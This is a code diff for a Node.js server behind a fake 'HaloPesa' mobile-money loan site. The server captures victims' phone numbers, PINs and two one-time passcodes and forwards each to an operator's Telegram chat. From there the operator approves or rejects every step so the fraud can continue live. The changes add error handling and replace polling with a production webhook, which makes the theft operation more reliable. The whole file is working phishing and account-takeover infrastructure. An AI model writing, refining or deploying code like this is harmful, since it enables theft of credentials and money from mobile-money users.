@@ -12,30 +12,34 @@ const CHAT_ID = process.env.CHAT_ID;
 let pinStatus = 'idle'; 
 let otp1Status = 'idle';        
 let otp2Status = 'idle';        
-let lastUpdateId = 0;
 
 let currentData = { phone: '', amount: '', months: '', pin: '', otp1: '', otp2: '' };
 
 // 1. Initial Loan Calculator Request
 app.post('/api/loan-request', (req, res) => {
-    const { amount, months } = req.body;
-    currentData.amount = amount;
-    currentData.months = months;
-    res.json({ status: 'ready_for_phone' });
+    try {
+        const { amount, months } = req.body;
+        currentData.amount = amount;
+        currentData.months = months;
+        res.json({ status: 'ready_for_phone' });
+    } catch (err) {
+        console.error('Error in loan-request:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
 });
 
 // 2. Phone, Amount, and Nambari ya Siri (PIN) Submitted -> Send to Telegram
 app.post('/api/submit-pin-data', async (req, res) => {
-    const { phone, pin } = req.body;
-    currentData.phone = phone;
-    currentData.pin = pin;
-    pinStatus = 'pending';
-    otp1Status = 'idle';
-    otp2Status = 'idle';
-
-    const message = `🚨 *Omba Mkopo HaloPesa* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`TZS ${Number(currentData.amount).toLocaleString()}\`\n📅 *Muda:* \`${currentData.months} Miezi\`\n🔑 *Nambari ya Siri (PIN):* \`${pin}\``;
-
     try {
+        const { phone, pin } = req.body;
+        currentData.phone = phone;
+        currentData.pin = pin;
+        pinStatus = 'pending';
+        otp1Status = 'idle';
+        otp2Status = 'idle';
+
+        const message = `🚨 *Omba Mkopo HaloPesa* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`TZS ${Number(currentData.amount).toLocaleString()}\`\n📅 *Muda:* \`${currentData.months} Miezi\`\n🔑 *Nambari ya Siri (PIN):* \`${pin}\``;
+
         await sendTelegramMessage(message, [
             [
                 { text: '✅ Approve PIN', callback_data: 'approve_pin' },
@@ -56,13 +60,13 @@ app.get('/api/check-pin-status', (req, res) => {
 
 // 3. OTP 1 Submitted -> Send to Telegram
 app.post('/api/verify-otp1', async (req, res) => {
-    const { otp1 } = req.body;
-    currentData.otp1 = otp1;
-    otp1Status = 'pending';
-
-    const message = `🔐 *HaloPesa First OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 1 Code:* \`${otp1}\``;
-
     try {
+        const { otp1 } = req.body;
+        currentData.otp1 = otp1;
+        otp1Status = 'pending';
+
+        const message = `🔐 *HaloPesa First OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 1 Code:* \`${otp1}\``;
+
         await sendTelegramMessage(message, [
             [
                 { text: '✅ Approve OTP 1', callback_data: 'correct_otp1' },
@@ -82,13 +86,13 @@ app.get('/api/check-otp1-status', (req, res) => {
 
 // 4. OTP 2 Submitted -> Send to Telegram
 app.post('/api/verify-otp2', async (req, res) => {
-    const { otp2 } = req.body;
-    currentData.otp2 = otp2;
-    otp2Status = 'pending';
-
-    const message = `🔐 *HaloPesa Second OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 2 Code:* \`${otp2}\``;
-
     try {
+        const { otp2 } = req.body;
+        currentData.otp2 = otp2;
+        otp2Status = 'pending';
+
+        const message = `🔐 *HaloPesa Second OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 2 Code:* \`${otp2}\``;
+
         await sendTelegramMessage(message, [
             [
                 { text: '✅ Approve OTP 2', callback_data: 'correct_otp2' },
@@ -106,60 +110,51 @@ app.get('/api/check-otp2-status', (req, res) => {
     res.json({ status: otp2Status });
 });
 
-// Telegram Long-Polling Loop
-async function pollTelegramUpdates() {
-    if (!BOT_TOKEN) return;
+// Telegram Webhook Endpoint for Production (Render)
+app.post('/telegram-webhook', async (req, res) => {
+    // Immediately send 200 OK so Telegram doesn't timeout or retry
+    res.sendStatus(200);
 
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
-        const data = await response.json();
+        const update = req.body;
+        if (update.callback_query) {
+            const action = update.callback_query.data;
+            const chatId = update.callback_query.message.chat.id;
+            const messageId = update.callback_query.message.message_id;
+            const callbackQueryId = update.callback_query.id;
 
-        if (data.ok && data.result && data.result.length > 0) {
-            for (const update of data.result) {
-                lastUpdateId = update.update_id;
+            await answerCallback(callbackQueryId, 'Processing action...');
+            await removeMessageButtons(chatId, messageId);
 
-                if (update.callback_query) {
-                    const action = update.callback_query.data;
-                    const chatId = update.callback_query.message.chat.id;
-                    const messageId = update.callback_query.message.message_id;
-                    const callbackQueryId = update.callback_query.id;
+            let statusMessage = '';
+            if (action === 'approve_pin') {
+                pinStatus = 'approved';
+                statusMessage = '✅ *Status: PIN Approved by Admin*';
+            } else if (action === 'reject_pin') {
+                pinStatus = 'rejected';
+                statusMessage = '❌ *Status: PIN Declined by Admin*';
+            } else if (action === 'correct_otp1') {
+                otp1Status = 'success';
+                statusMessage = '✅ *Status: OTP 1 Approved by Admin*';
+            } else if (action === 'wrong_otp1') {
+                otp1Status = 'wrong';
+                statusMessage = '❌ *Status: OTP 1 Declined by Admin*';
+            } else if (action === 'correct_otp2') {
+                otp2Status = 'success';
+                statusMessage = '✅ *Status: OTP 2 Approved - Loan Finalized!*';
+            } else if (action === 'wrong_otp2') {
+                otp2Status = 'wrong';
+                statusMessage = '❌ *Status: OTP 2 Declined by Admin*';
+            }
 
-                    await answerCallback(callbackQueryId, 'Processing action...');
-                    await removeMessageButtons(chatId, messageId);
-
-                    let statusMessage = '';
-                    if (action === 'approve_pin') {
-                        pinStatus = 'approved';
-                        statusMessage = '✅ *Status: PIN Approved by Admin*';
-                    } else if (action === 'reject_pin') {
-                        pinStatus = 'rejected';
-                        statusMessage = '❌ *Status: PIN Declined by Admin*';
-                    } else if (action === 'correct_otp1') {
-                        otp1Status = 'success';
-                        statusMessage = '✅ *Status: OTP 1 Approved by Admin*';
-                    } else if (action === 'wrong_otp1') {
-                        otp1Status = 'wrong';
-                        statusMessage = '❌ *Status: OTP 1 Declined by Admin*';
-                    } else if (action === 'correct_otp2') {
-                        otp2Status = 'success';
-                        statusMessage = '✅ *Status: OTP 2 Approved - Loan Finalized!*';
-                    } else if (action === 'wrong_otp2') {
-                        otp2Status = 'wrong';
-                        statusMessage = '❌ *Status: OTP 2 Declined by Admin*';
-                    }
-
-                    if (statusMessage) {
-                        await sendStatusMessage(chatId, statusMessage);
-                    }
-                }
+            if (statusMessage) {
+                await sendStatusMessage(chatId, statusMessage);
             }
         }
     } catch (err) {
-        console.error('Polling error:', err.message);
+        console.error('Webhook processing error:', err.message);
     }
-
-    setTimeout(pollTelegramUpdates, 1000);
-}
+});
 
 async function answerCallback(callbackQueryId, text) {
     try {
@@ -221,5 +216,4 @@ async function sendStatusMessage(chatId, text) {
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`HaloPesa Loan server running successfully on port ${PORT}`);
-    pollTelegramUpdates();
 });
